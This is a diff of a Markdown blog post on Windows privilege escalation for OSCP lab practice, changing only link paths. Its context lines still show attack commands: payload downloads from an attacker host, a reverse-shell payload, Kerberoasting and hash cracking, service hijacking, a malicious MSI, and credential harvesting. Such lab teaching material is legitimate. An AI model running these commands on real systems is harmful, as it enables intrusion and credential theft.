@@ -1,12 +1,14 @@
 ---
 title: "Windows Privilege Escalation — Full Analysis from 60+ Writeups (OSCP Oriented)"
 date: 2026-03-06
+permalink: /en/posts/tech-windows-privesc-summary/
+legacy_permalink: /posts/tech-windows-privesc-summary/
 description: "Data-driven analysis of Windows privilege escalation techniques from 60+ writeups across TryHackMe, HackTheBox, and Proving Grounds. OSCP-focused: all techniques are manual / Metasploit-free. Includes the complete Proving Grounds Windows dataset."
 categories: [TechBlog]
 tags: [windows, privilege-escalation, kerberoasting, seimpersonate, potato, service-misconfig, pentest, oscp, active-directory, proving-grounds]
 mermaid: true
 content_lang: en
-alt_ja: /posts/tech-windows-privesc-summary-ja/
+alt_ja: /ja/posts/tech-windows-privesc-summary/
 ---
 
 ## TL;DR
@@ -65,7 +67,7 @@ Proving Grounds machines are the most directly relevant to OSCP preparation. Thi
 
 ### PG — Craft2 (Windows 10)
 
-**[→ Full writeup](/posts/pg-craft2/)**
+**[→ Full writeup](/en/posts/pg-craft2/)**
 
 | Field | Value |
 |-------|-------|
@@ -131,7 +133,7 @@ certutil -urlcache -f http://$KALI/WerTrigger.exe WerTrigger.exe
 
 ### PG — Apex (Linux/Samba — categorized as Windows)
 
-**[→ Full writeup](/posts/pg-apex/)**
+**[→ Full writeup](/en/posts/pg-apex/)**
 
 | Field | Value |
 |-------|-------|
@@ -174,7 +176,7 @@ mysql -h $ip -u openemr -pC78maEQUIEuQ --skip-ssl
 
 ### PG — Bratarina (Linux/Samba — categorized as Windows)
 
-**[→ Full writeup](/posts/pg-bratarina/)**
+**[→ Full writeup](/en/posts/pg-bratarina/)**
 
 | Field | Value |
 |-------|-------|
@@ -218,7 +220,7 @@ python3 47984.py $ip 25 'python -c "import socket,subprocess,os;s=socket.socket(
 
 ### PG — Clue (Linux/Debian — categorized as Windows)
 
-**[→ Full writeup](/posts/pg-clue/)**
+**[→ Full writeup](/en/posts/pg-clue/)**
 
 | Field | Value |
 |-------|-------|
@@ -290,7 +292,7 @@ certutil -urlcache -split -f http://$KALI/GodPotato.exe C:\Temp\GodPotato.exe
 .\PrintSpoofer64.exe -i -c cmd
 ```
 
-**Observed:** [THM - Alfred](/posts/thm-alfred/) — Jenkins → SeImpersonate → PrintSpoofer → SYSTEM
+**Observed:** [THM - Alfred](/en/posts/thm-alfred/) — Jenkins → SeImpersonate → PrintSpoofer → SYSTEM
 
 ---
 
@@ -301,7 +303,7 @@ python3 GetUserSPNs.py -request -dc-ip $ip DOMAIN/user:'pass' -outputfile hash.t
 hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
 ```
 
-**Observed:** [HTB - Active](/posts/htb-active/), [THM - Corp](/posts/thm-corp/)
+**Observed:** [HTB - Active](/en/posts/htb-active/), [THM - Corp](/en/posts/thm-corp/)
 
 ---
 
@@ -313,7 +315,7 @@ sc config <service> binPath= "C:\Temp\shell.exe"
 sc stop <service> && sc start <service>
 ```
 
-**Observed:** [THM - Windows PrivEsc Arena](/posts/thm-windows-privesc-arena/)
+**Observed:** [THM - Windows PrivEsc Arena](/en/posts/thm-windows-privesc-arena/)
 
 ---
 
@@ -325,7 +327,7 @@ echo C:\Temp\shell.exe >> C:\DevTools\CleanUp.ps1
 rlwrap -cAri nc -lvnp 443   :: catch SYSTEM shell when task fires
 ```
 
-**Observed:** [THM - Windows PrivEsc](/posts/thm-windows-privesc/)
+**Observed:** [THM - Windows PrivEsc](/en/posts/thm-windows-privesc/)
 
 ---
 
@@ -336,7 +338,7 @@ smbclient //$ip/Replication -N   # → navigate to Groups.xml
 gpp-decrypt "<cpassword>"
 ```
 
-**Observed:** [HTB - Active](/posts/htb-active/)
+**Observed:** [HTB - Active](/en/posts/htb-active/)
 
 ---
 
@@ -355,7 +357,7 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=4444 -f msi -o shell
 msiexec /quiet /qn /i C:\Temp\shell.msi
 ```
 
-**Observed:** [THM - Windows PrivEsc Arena](/posts/thm-windows-privesc-arena/)
+**Observed:** [THM - Windows PrivEsc Arena](/en/posts/thm-windows-privesc-arena/)
 
 ---
 
@@ -367,7 +369,7 @@ hashcat -m 18200 asrep.txt rockyou.txt
 bloodhound-python -d htb.local -u svc-alfresco -p <pass> -c All -ns $ip
 ```
 
-**Observed:** [HTB - Forest](/posts/htb-forest/)
+**Observed:** [HTB - Forest](/en/posts/htb-forest/)
 
 ---
 
@@ -380,7 +382,7 @@ reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
 findstr /si password *.txt *.xml *.ini *.config
 ```
 
-**Observed:** [THM - Corp](/posts/thm-corp/)
+**Observed:** [THM - Corp](/en/posts/thm-corp/)
 
 ---
 
@@ -469,47 +471,47 @@ findstr /si password *.txt *.xml *.ini *.config
 
 | Machine | Actual OS | Entry Vector | PrivEsc | Link |
 |---------|-----------|--------------|---------|------|
-| **Craft2** | Windows 10 | Bad-ODF NTLM → web shell | CVE-2020-1337 (WerTrigger + DLL) | [→](/posts/pg-craft2/) |
-| **Apex** | Linux (Ubuntu) | OpenEMR LFI (CVE-2018-17179) | sqlconf.php → MySQL credential | [→](/posts/pg-apex/) |
-| **Bratarina** | Linux (Samba) | OpenSMTPD RCE (CVE-2020-7247) | Direct root from exploit | [→](/posts/pg-bratarina/) |
-| **Clue** | Linux (Debian) | Cassandra Web LFI → FreeSWITCH RCE | sudo → re-exploit LFI as root | [→](/posts/pg-clue/) |
+| **Craft2** | Windows 10 | Bad-ODF NTLM → web shell | CVE-2020-1337 (WerTrigger + DLL) | [→](/en/posts/pg-craft2/) |
+| **Apex** | Linux (Ubuntu) | OpenEMR LFI (CVE-2018-17179) | sqlconf.php → MySQL credential | [→](/en/posts/pg-apex/) |
+| **Bratarina** | Linux (Samba) | OpenSMTPD RCE (CVE-2020-7247) | Direct root from exploit | [→](/en/posts/pg-bratarina/) |
+| **Clue** | Linux (Debian) | Cassandra Web LFI → FreeSWITCH RCE | sudo → re-exploit LFI as root | [→](/en/posts/pg-clue/) |
 
 ### HackTheBox Windows
 
 | Machine | Entry Vector | PrivEsc | Link |
 |---------|--------------|---------|------|
-| **Active** | SMB null → GPP cpassword | Kerberoasting → Domain Admin | [→](/posts/htb-active/) |
-| **Forest** | LDAP user enum | AS-REP Roast → BloodHound → DCSync | [→](/posts/htb-forest/) |
-| **Fluffy** | (see writeup) | (see writeup) | [→](/posts/htb-fluffy/) |
-| **Legacy** | (see writeup) | (see writeup) | [→](/posts/htb-legacy/) |
+| **Active** | SMB null → GPP cpassword | Kerberoasting → Domain Admin | [→](/en/posts/htb-active/) |
+| **Forest** | LDAP user enum | AS-REP Roast → BloodHound → DCSync | [→](/en/posts/htb-forest/) |
+| **Fluffy** | (see writeup) | (see writeup) | [→](/en/posts/htb-fluffy/) |
+| **Legacy** | (see writeup) | (see writeup) | [→](/en/posts/htb-legacy/) |
 
 ### TryHackMe Windows (Key Machines)
 
 | Machine | Entry Vector | PrivEsc | Link |
 |---------|--------------|---------|------|
-| **Windows PrivEsc** | local shell | Writable script + SYSTEM scheduler | [→](/posts/thm-windows-privesc/) |
-| **Windows PrivEsc Arena** | RDP | Service misconfig / AlwaysInstallElevated / unquoted path | [→](/posts/thm-windows-privesc-arena/) |
-| **Alfred** | Jenkins default cred | SeImpersonate → PrintSpoofer | [→](/posts/thm-alfred/) |
-| **Corp** | local RDP | Kerberoasting + Unattend.xml | [→](/posts/thm-corp/) |
-| **Retro** | WordPress cred → RDP | Kernel exploit | [→](/posts/thm-retro/) |
-| **Steel Mountain** | Rejetto HFS CVE | Service misconfiguration | [→](/posts/thm-steel-mountain/) |
-| **HackPark** | Web brute force | (see writeup) | [→](/posts/thm-hackpark/) |
-| **Blaster** | (see writeup) | (see writeup) | [→](/posts/thm-blaster/) |
-| **Holo** | (see writeup) | (see writeup) | [→](/posts/thm-holo/) |
-| **Stealth** | (see writeup) | (see writeup) | [→](/posts/thm-stealth/) |
-| **Attacking Kerberos** | Kerberos attacks | AD lab | [→](/posts/thm-attacking-kerberos/) |
-| **Attacktive Directory** | AD lab | AD lab | [→](/posts/thm-attacktive-directory/) |
+| **Windows PrivEsc** | local shell | Writable script + SYSTEM scheduler | [→](/en/posts/thm-windows-privesc/) |
+| **Windows PrivEsc Arena** | RDP | Service misconfig / AlwaysInstallElevated / unquoted path | [→](/en/posts/thm-windows-privesc-arena/) |
+| **Alfred** | Jenkins default cred | SeImpersonate → PrintSpoofer | [→](/en/posts/thm-alfred/) |
+| **Corp** | local RDP | Kerberoasting + Unattend.xml | [→](/en/posts/thm-corp/) |
+| **Retro** | WordPress cred → RDP | Kernel exploit | [→](/en/posts/thm-retro/) |
+| **Steel Mountain** | Rejetto HFS CVE | Service misconfiguration | [→](/en/posts/thm-steel-mountain/) |
+| **HackPark** | Web brute force | (see writeup) | [→](/en/posts/thm-hackpark/) |
+| **Blaster** | (see writeup) | (see writeup) | [→](/en/posts/thm-blaster/) |
+| **Holo** | (see writeup) | (see writeup) | [→](/en/posts/thm-holo/) |
+| **Stealth** | (see writeup) | (see writeup) | [→](/en/posts/thm-stealth/) |
+| **Attacking Kerberos** | Kerberos attacks | AD lab | [→](/en/posts/thm-attacking-kerberos/) |
+| **Attacktive Directory** | AD lab | AD lab | [→](/en/posts/thm-attacktive-directory/) |
 
 ### Related TechBlog Posts
 
 | Post | Link |
 |------|------|
-| Windows Potato PrivEsc Guide (GodPotato → Hot Potato) | [→](/posts/tech-windows-potato-privesc/) |
-| PsExec Lateral Movement | [→](/posts/tech-psexec-lateral-movement/) |
-| NTLM Relay (ntlmrelayx) | [→](/posts/tech-ntlmrelayx-attack-guide/) |
-| Kerberoasting (GetUserSPNs) | [→](/posts/tech-getuserspns-kerberoasting/) |
-| RBCD Attack | [→](/posts/tech-rbcd-attack-guide/) |
-| AD CS / Certipy | [→](/posts/tech-certipy-adcs-attack/) |
+| Windows Potato PrivEsc Guide (GodPotato → Hot Potato) | [→](/en/posts/tech-windows-potato-privesc/) |
+| PsExec Lateral Movement | [→](/en/posts/tech-psexec-lateral-movement/) |
+| NTLM Relay (ntlmrelayx) | [→](/en/posts/tech-ntlmrelayx-attack-guide/) |
+| Kerberoasting (GetUserSPNs) | [→](/en/posts/tech-getuserspns-kerberoasting/) |
+| RBCD Attack | [→](/en/posts/tech-rbcd-attack-guide/) |
+| AD CS / Certipy | [→](/en/posts/tech-certipy-adcs-attack/) |
 
 ---
 
